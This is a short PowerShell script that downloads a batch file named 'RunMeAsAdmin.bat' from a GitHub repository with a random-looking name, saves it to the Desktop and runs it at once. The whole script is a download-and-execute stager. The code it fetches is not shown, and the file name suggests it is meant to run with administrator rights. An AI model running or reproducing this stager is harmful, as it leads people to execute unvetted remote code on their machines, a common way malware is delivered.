# URL of the batch file
$batchUrl = "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdiflwejk/refs/heads/main/RunMeAsAdmin.bat"

# Path to the Desktop
$desktopPath = [Environment]::GetFolderPath("Desktop")

# Full path for the downloaded batch file
$batchPath = Join-Path $desktopPath "script.bat"

try {
    # Ensure TLS 1.2 (important for many HTTPS sites)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Download the batch file
    Invoke-WebRequest -Uri $batchUrl -OutFile $batchPath -UseBasicParsing

    Write-Host "Batch file downloaded to $batchPath"

    # Run the batch file
    Start-Process -FilePath $batchPath -WorkingDirectory $desktopPath

} catch {
    Write-Error "Failed to download or run the batch file: $_"
}
